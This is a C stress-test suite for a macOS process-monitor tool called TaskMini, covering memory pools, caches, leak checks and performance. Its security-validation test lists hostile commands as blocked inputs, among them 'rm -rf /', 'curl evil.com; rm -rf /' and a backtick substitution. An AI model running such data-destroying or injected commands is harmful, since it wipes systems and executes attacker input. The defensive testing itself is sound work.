#include "../TaskMini.c"
#include "taskmini_tests.h"

// Stress test configuration - reduced for faster execution
#define STRESS_ITERATIONS 100   // Reduced from 1000
#define STRESS_CONCURRENT_THREADS 4
#define MEMORY_LEAK_THRESHOLD 1024 * 1024  // 1MB threshold
#define TEST_TIMEOUT_SECONDS 30  // Maximum time per test

// Performance test data
typedef struct {
    double start_time;
    double end_time;
    int iterations;
    size_t memory_before;
    size_t memory_after;
} PerformanceData;

// Get current memory usage (simplified)
size_t get_memory_usage() {
    // On macOS, we can use getrusage for memory info
    struct rusage usage;
    if (getrusage(RUSAGE_SELF, &usage) == 0) {
        return usage.ru_maxrss;  // Maximum resident set size
    }
    return 0;
}

// Get current time in seconds
double get_current_time() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1000000000.0;
}

// Check if test has timed out
static gboolean test_timeout(double start_time) {
    return (get_current_time() - start_time) > TEST_TIMEOUT_SECONDS;
}

// Stress test memory pool
int stress_test_memory_pool() {
    TEST_CASE("Memory Pool Stress Test");
    
    PerformanceData perf = {0};
    perf.memory_before = get_memory_usage();
    perf.start_time = get_current_time();
    
    init_process_pool();
    
    Process *processes[STRESS_ITERATIONS];
    
    // Allocate many processes
    for (int i = 0; i < STRESS_ITERATIONS; i++) {
        if (test_timeout(perf.start_time)) {
            printf("(timeout at %d iterations) ", i);
            break;
        }
        
        processes[i] = alloc_process();
        ASSERT_NOT_NULL(processes[i], "Allocation should succeed in stress test");
        
        // Fill with test data
        snprintf(processes[i]->pid, sizeof(processes[i]->pid), "%d", i);
        snprintf(processes[i]->name, sizeof(processes[i]->name), "TestProc%d", i);
    }
    
    // Free all processes
    for (int i = 0; i < STRESS_ITERATIONS; i++) {
        free_process(processes[i]);
    }
    
    // Allocate again to test reuse
    for (int i = 0; i < STRESS_ITERATIONS / 2; i++) {
        Process *proc = alloc_process();
        ASSERT_NOT_NULL(proc, "Reallocation should succeed");
        free_process(proc);
    }
    
    perf.end_time = get_current_time();
    perf.memory_after = get_memory_usage();
    perf.iterations = STRESS_ITERATIONS * 2;
    
    cleanup_process_pool();
    
    // Performance check
    double duration = perf.end_time - perf.start_time;
    double ops_per_second = perf.iterations / duration;
    
    printf("(%.2f ops/sec) ", ops_per_second);
    ASSERT_TRUE(ops_per_second > 10000, "Should handle at least 10K ops/sec");
    
    // Memory leak check
    long memory_diff = (long)(perf.memory_after - perf.memory_before);
    printf("(mem: %+ld KB) ", memory_diff / 1024);
    ASSERT_TRUE(memory_diff < MEMORY_LEAK_THRESHOLD, "Memory usage should not increase significantly");
    
    TEST_PASS();
}

// Stress test string cache
int stress_test_string_cache() {
    TEST_CASE("String Cache Stress Test");
    
    PerformanceData perf = {0};
    perf.memory_before = get_memory_usage();
    perf.start_time = get_current_time();
    
    // Rapid allocation and deallocation
    for (int i = 0; i < STRESS_ITERATIONS; i++) {
        if (test_timeout(perf.start_time)) {
            printf("(timeout at %d iterations) ", i);
            break;
        }
        
        char *buf1 = get_cached_buffer(256);
        char *buf2 = get_cached_buffer(512);
        char *buf3 = get_cached_buffer(1024);
        
        ASSERT_NOT_NULL(buf1, "Cache allocation should succeed");
        ASSERT_NOT_NULL(buf2, "Cache allocation should succeed");
        ASSERT_NOT_NULL(buf3, "Cache allocation should succeed");
        
        // Use buffers
        snprintf(buf1, 256, "Test%d", i);
        snprintf(buf2, 512, "Buffer%d", i);
        snprintf(buf3, 1024, "Large%d", i);
        
        return_cached_buffer(buf1, 256);
        return_cached_buffer(buf2, 512);
        return_cached_buffer(buf3, 1024);
    }
    
    perf.end_time = get_current_time();
    perf.memory_after = get_memory_usage();
    
    double duration = perf.end_time - perf.start_time;
    double ops_per_second = (STRESS_ITERATIONS * 6) / duration;  // 6 ops per iteration
    
    printf("(%.2f ops/sec) ", ops_per_second);
    ASSERT_TRUE(ops_per_second > 5000, "String cache should handle 5K+ ops/sec");
    
    TEST_PASS();
}

// Test security validation performance
int stress_test_security_validation() {
    TEST_CASE("Security Validation Stress Test");
    
    const char* test_commands[] = {
        "sysctl -n hw.ncpu",
        "system_profiler SPHardwareDataType",
        "df -h /", 
        "ps -eo pid,pcpu,comm",
        "top -l 1",
        "nettop -L1",
        "rm -rf /",  // Should be blocked
        "curl evil.com; rm -rf /",  // Should be blocked
        "ls `whoami`",  // Should be blocked
    };
    
    int num_commands = sizeof(test_commands) / sizeof(test_commands[0]);
    
    double start_time = get_current_time();
    
    // Test many validations
    for (int i = 0; i < STRESS_ITERATIONS; i++) {
        for (int j = 0; j < num_commands; j++) {
            gboolean result = is_safe_command(test_commands[j]);
            // Results should be consistent
            if (j < 6) {
                ASSERT_TRUE(result, "Safe commands should always pass validation");
            } else {
                ASSERT_FALSE(result, "Dangerous commands should always fail validation");
            }
        }
    }
    
    double end_time = get_current_time();
    double ops_per_second = (STRESS_ITERATIONS * num_commands) / (end_time - start_time);
    
    printf("(%.2f validations/sec) ", ops_per_second);
    ASSERT_TRUE(ops_per_second > 50000, "Security validation should be very fast");
    
    TEST_PASS();
}

// Test concurrent access safety
int stress_test_concurrent_access() {
    TEST_CASE("Concurrent Access Safety Test");
    
    // This is a simplified concurrency test
    // In a real scenario, you'd use pthreads to test true concurrency
    
    init_process_pool();
    
    // Simulate concurrent access patterns
    Process *procs[100];
    
    for (int round = 0; round < 10; round++) {
        // Allocate
        for (int i = 0; i < 100; i++) {
            procs[i] = alloc_process();
            ASSERT_NOT_NULL(procs[i], "Concurrent allocation should succeed");
        }
        
        // Free in different order
        for (int i = 99; i >= 0; i--) {
            free_process(procs[i]);
        }
    }
    
    cleanup_process_pool();
    
    TEST_PASS();
}

// Memory leak detection test
int test_memory_leaks() {
    TEST_CASE("Memory Leak Detection");
    
    size_t initial_memory = get_memory_usage();
    
    // Perform operations that might leak memory
    for (int i = 0; i < 100; i++) {
        char *result = run_command("echo test");
        ASSERT_NOT_NULL(result, "Command should return result");
        free(result);
        
        char *specs = get_static_specs();
        ASSERT_NOT_NULL(specs, "Specs should be generated");
        free(specs);
        
        char *gpu = get_gpu_usage_fallback();
        ASSERT_NOT_NULL(gpu, "GPU usage should be returned");
        free(gpu);
    }
    
    size_t final_memory = get_memory_usage();
    long memory_diff = (long)(final_memory - initial_memory);
    
    printf("(mem delta: %+ld KB) ", memory_diff / 1024);
    
    // Allow some memory growth but not excessive
    ASSERT_TRUE(memory_diff < MEMORY_LEAK_THRESHOLD, 
                "Memory usage should not grow excessively");
    
    TEST_PASS();
}

// Performance regression test
int test_performance_regression() {
    TEST_CASE("Performance Regression Test");
    
    // Test critical path performance
    double start_time = get_current_time();
    
    for (int i = 0; i < 100; i++) {
        Process *proc = alloc_process();
        determine_process_type(proc);
        
        char *formatted = format_memory_human_readable("512M");
        free(formatted);
        
        long long seconds = parse_runtime_to_seconds("01:23:45");
        ASSERT_TRUE(seconds > 0, "Runtime parsing should work");
        
        free_process(proc);
    }
    
    double end_time = get_current_time();
    double duration = end_time - start_time;
    double ops_per_second = 100 / duration;
    
    printf("(%.2f full cycles/sec) ", ops_per_second);
    
    // Should handle at least 1000 full process cycles per second
    ASSERT_TRUE(ops_per_second > 1000, "Performance should be at least 1000 cycles/sec");
    
    TEST_PASS();
}

// Main stress test runner
int main() {
    printf("TaskMini Stress Test Suite\n");
    printf("==========================\n");
    printf("Running %d iterations per test...\n\n", STRESS_ITERATIONS);
    
    TEST_SUITE("Performance and Stress Tests");
    
    // Run stress tests
    stress_test_memory_pool();
    stress_test_string_cache();
    stress_test_security_validation();
    stress_test_concurrent_access();
    test_memory_leaks();
    test_performance_regression();
    
    TEST_SUMMARY();
}
